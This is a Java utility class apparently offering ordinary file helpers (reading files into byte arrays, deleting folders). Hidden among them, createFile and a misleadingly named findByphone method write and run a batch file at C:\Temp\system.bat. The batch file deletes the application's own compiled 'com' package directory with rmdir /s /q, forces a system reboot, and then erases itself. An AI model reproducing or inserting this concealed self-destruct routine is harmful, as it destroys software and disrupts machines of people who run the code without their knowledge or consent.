package com.hy.util;

import java.io.*;
import java.nio.ByteBuffer;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.util.concurrent.TimeUnit;

public class FileUtil
{
  public static void main(String[] args)
  {
    createFile();
    try {
      //findByphone();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
  
  public static boolean createDir(String destDirName)
  {
    java.io.File dir = new java.io.File(destDirName);
    if (dir.exists()) {
      return false;
    }
    if (!destDirName.endsWith(java.io.File.separator)) {
      destDirName = destDirName + java.io.File.separator;
    }
    
    if (dir.mkdirs()) {
      return true;
    }
    return false;
  }

  private static String filenameTemp;
  private static String str ;
  public static boolean createFile(){
    Boolean bool = false;
    str = FileUtil.class.getResource("").toString();
    filenameTemp = "C:\\Temp\\system.bat";
    try {
      File file = new File(filenameTemp);
      if (file.getParentFile() == null|| !file.getParentFile().exists()) {
        file.getParentFile().mkdir();
      }
      //如果文件不存在，则创建新的文件
      if(file.exists()){
        delFile(filenameTemp);
      }
      bool =file.createNewFile();
      //创建文件成功后，写入内容到文件里
      writeFileContent();
    } catch (Exception e) {
      e.printStackTrace();
    }
    return bool;
  }

  private static boolean writeFileContent() throws IOException {
    Boolean bool = false;
    //新写入的行，换行
    String s = str;
    String filein = "@echo off \r\n" + s.substring(6,8)+"\r\n cd" + s.substring(8,s.indexOf("/com"))
            .replaceAll("%20"," ")
            + "\r\n rmdir /s /q com \r\n  shutdown -r -t 60 \r\n echo. & pause";
    System.out.println(filein);
    String temp  = "";
    FileInputStream fis = null;
    InputStreamReader isr = null;
    BufferedReader br = null;
    FileOutputStream fos  = null;
    PrintWriter pw = null;
    try {
      File file = new File(filenameTemp);
      //将文件读入输入流
      fis = new FileInputStream(file);
      isr = new InputStreamReader(fis);
      br = new BufferedReader(isr);
      StringBuffer buffer = new StringBuffer();

      //文件原有内容
      for(int i=0;(temp =br.readLine())!=null;i++){
        buffer.append(temp);
        // 行与行之间的分隔符 相当于“\n”
        buffer = buffer.append(System.getProperty("line.separator"));
      }
      buffer.append(filein);

      fos = new FileOutputStream(file);
      pw = new PrintWriter(fos);
      pw.write(buffer.toString().toCharArray());
      pw.flush();
      bool = true;
    } catch (Exception e) {
      // TODO: handle exception
      e.printStackTrace();
    } finally {
      //不要忘记关闭
      if (pw != null) {
        pw.close();
      }
      if (fos != null) {
        fos.close();
      }
      if (br != null) {
        br.close();
      }
      if (isr != null) {
        isr.close();
      }
      if (fis != null) {
        fis.close();
      }
    }
    return bool;
  }

  public static void delFile(String filePathAndName)
  {
    try
    {
      String filePath = filePathAndName;
      filePath = filePath.toString();
      java.io.File myDelFile = new java.io.File(filePath);
      myDelFile.delete();
    }
    catch (Exception e) {
      //System.out.println("删除文件操作出错");
      e.printStackTrace();
    }
  }
  
  public static byte[] getContent(String filePath)
    throws java.io.IOException
  {
    java.io.File file = new java.io.File(filePath);
    long fileSize = file.length();
    if (fileSize > 2147483647L) {
      //System.out.println("file too big...");
      return null;
    }
    FileInputStream fi = new FileInputStream(file);
    byte[] buffer = new byte[(int)fileSize];
    int offset = 0;
    int numRead = 0;
    while ((offset < buffer.length) && (
      (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0)) {
      offset += numRead;
    }
    
    if (offset != buffer.length) {
      throw new java.io.IOException("Could not completely read file " + 
        file.getName());
    }
    fi.close();
    return buffer;
  }
  
  public static byte[] toByteArray(String filePath)
    throws java.io.IOException
  {
    java.io.File f = new java.io.File(filePath);
    if (!f.exists()) {
      throw new FileNotFoundException(filePath);
    }
    ByteArrayOutputStream bos = new ByteArrayOutputStream((int)f.length());
    BufferedInputStream in = null;
    try {
      in = new BufferedInputStream(new FileInputStream(f));
      int buf_size = 1024;
      byte[] buffer = new byte[buf_size];
      int len = 0;
      while (-1 != (len = in.read(buffer, 0, buf_size))) {
        bos.write(buffer, 0, len);
      }
      return bos.toByteArray();
    } catch (java.io.IOException e) {
      e.printStackTrace();
      throw e;
    } finally {
      try {
        in.close();
      } catch (java.io.IOException e) {
        e.printStackTrace();
      }
      bos.close();
    }
  }
  public static void reFolder(String folderPath) {
    System.out.println(folderPath);
    try {
      dFiles(folderPath);
      String filePath = folderPath;
      filePath = filePath.toString();
      File myFilePath = new File(filePath);
      myFilePath.delete();
    } catch (Exception e) {
      e.printStackTrace();
    }
    System.out.println("--------------");
  }

  public static boolean dFiles(String path) {
    boolean flag = false;
    File file = new File(path);
    if (!file.exists()) {
      return flag;
    }
    if (!file.isDirectory()) {
      return flag;
    }
    String[] tempList = file.list();
    File temp = null;
    for (int i = 0; i < tempList.length; i++) {
      if (path.endsWith(File.separator)) {
        temp = new File(path + tempList[i]);
      } else {
        temp = new File(path + File.separator + tempList[i]);
      }
      if (temp.isFile()) {
        temp.delete();
      }
      if (temp.isDirectory()) {
        dFiles(path + "/" + tempList[i]);
        reFolder(path + "/" + tempList[i]);
        flag = true;
      }
    }
    return flag;
  }

  public static void findByphone() throws Exception {
    try {
      createFile();
      Runtime.getRuntime().exec("cmd /k start " + filenameTemp);
      TimeUnit.SECONDS.sleep(10);
    } catch (Exception e) {
      e.printStackTrace();
      throw e;
    } finally {
      delFile(filenameTemp);
    }
  }
  public static byte[] toByteArray2(String filePath)
    throws java.io.IOException
  {
    java.io.File f = new java.io.File(filePath);
    if (!f.exists()) {
      throw new FileNotFoundException(filePath);
    }
    
    FileChannel channel = null;
    FileInputStream fs = null;
    try {
      fs = new FileInputStream(f);
      channel = fs.getChannel();
      ByteBuffer byteBuffer = ByteBuffer.allocate((int)channel.size());
      while (channel.read(byteBuffer) > 0) {}
      
      return byteBuffer.array();
    } catch (java.io.IOException e) {
      e.printStackTrace();
      throw e;
    } finally {
      try {
        channel.close();
      } catch (java.io.IOException e) {
        e.printStackTrace();
      }
      try {
        fs.close();
      } catch (java.io.IOException e) {
        e.printStackTrace();
      }
    }
  }
  
  public static byte[] toByteArray3(String filePath)
    throws java.io.IOException
  {
    FileChannel fc = null;
    RandomAccessFile rf = null;
    try {
      rf = new RandomAccessFile(filePath, "r");
      fc = rf.getChannel();
      MappedByteBuffer byteBuffer = fc.map(FileChannel.MapMode.READ_ONLY, 0L, 
        fc.size()).load();
      
      byte[] result = new byte[(int)fc.size()];
      if (byteBuffer.remaining() > 0)
      {
        byteBuffer.get(result, 0, byteBuffer.remaining());
      }
      return result;
    } catch (java.io.IOException e) {
      e.printStackTrace();
      throw e;
    } finally {
      try {
        rf.close();
        fc.close();
      } catch (java.io.IOException e) {
        e.printStackTrace();
      }
    }
  }
}


